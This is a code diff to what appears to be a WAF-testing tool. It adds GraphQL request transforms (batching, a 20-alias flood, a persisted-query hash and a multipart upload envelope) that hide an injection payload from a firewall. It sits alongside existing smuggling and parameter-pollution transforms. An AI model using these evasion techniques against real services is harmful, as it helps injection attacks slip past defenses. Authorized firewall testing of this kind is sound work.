@@ -281,6 +281,49 @@ def _graphql_body(t: Target, payload: str):
                        "-d", body]
 
 
+def _graphql_batch(t: Target, payload: str):
+    batch = json.dumps([
+        {"query": "{ __typename }"},
+        {"query": f'{{ search(q: {json.dumps(payload)}) {{ id }} }}'},
+    ])
+    return _base(t) + ["-X", "POST", _url(t), "-H", "Content-Type: application/json",
+                       "-d", batch]
+
+
+def _graphql_alias_flood(t: Target, payload: str):
+    fields = " ".join(
+        f'a{i}: search(q: {json.dumps(payload)}) {{ id }}'
+        for i in range(20)
+    )
+    body = json.dumps({"query": f"{{ {fields} }}"})
+    return _base(t) + ["-X", "POST", _url(t), "-H", "Content-Type: application/json",
+                       "-d", body]
+
+
+def _graphql_persisted(t: Target, payload: str):
+    import hashlib
+    query = f'{{ search(q: {json.dumps(payload)}) {{ id }} }}'
+    sha = hashlib.sha256(query.encode()).hexdigest()
+    body = json.dumps({"extensions": {"persistedQuery": {"version": 1, "sha256Hash": sha}}})
+    return _base(t) + ["-X", "POST", _url(t), "-H", "Content-Type: application/json",
+                       "-d", body]
+
+
+def _graphql_multipart(t: Target, payload: str):
+    b = "----WAFFENgqlBound"
+    operations = json.dumps({"query": "mutation($file: Upload!) { upload(file: $file) { url } }",
+                             "variables": {"file": None}})
+    mp_map = json.dumps({"0": ["variables.file"]})
+    body = (f"--{b}\r\nContent-Disposition: form-data; name=\"operations\"\r\n\r\n{operations}\r\n"
+            f"--{b}\r\nContent-Disposition: form-data; name=\"map\"\r\n\r\n{mp_map}\r\n"
+            f"--{b}\r\nContent-Disposition: form-data; name=\"0\"; filename=\"{payload}\"\r\n"
+            f"Content-Type: application/octet-stream\r\n\r\n{payload}\r\n"
+            f"--{b}--\r\n")
+    return _base(t) + ["-X", "POST", _url(t),
+                       "-H", f"Content-Type: multipart/form-data; boundary={b}",
+                       "--data-binary", body]
+
+
 TRANSFORMS: list[RequestTransform] = [
     RequestTransform("identity", "default injection (no request reshaping)", _identity),
     RequestTransform("hpp_duplicate", "duplicate param: benign then payload", _hpp_duplicate),
@@ -306,6 +349,10 @@ TRANSFORMS: list[RequestTransform] = [
     RequestTransform("mp_filename_rfc2231", "multipart RFC 2231 filename* smuggling (CVE-2026-104269)", _mp_filename_rfc2231),
     RequestTransform("xml_body", "payload inside an XML element", _xml_body),
     RequestTransform("graphql_body", "minimal GraphQL query+variables envelope", _graphql_body),
+    RequestTransform("graphql_batch", "GraphQL batching — payload hidden in second query", _graphql_batch),
+    RequestTransform("graphql_alias_flood", "GraphQL alias flood — 20 copies of payload in aliases", _graphql_alias_flood),
+    RequestTransform("graphql_persisted", "GraphQL persisted query hash (APQ)", _graphql_persisted),
+    RequestTransform("graphql_multipart", "GraphQL multipart upload spec envelope", _graphql_multipart),
 ]
 # transforms that reshape the request STRUCTURE (parser-differential), a distinct axis
 STRUCTURAL = {"json_dup_key", "json_unicode_key", "json_array_wrap", "json_nested_junk",
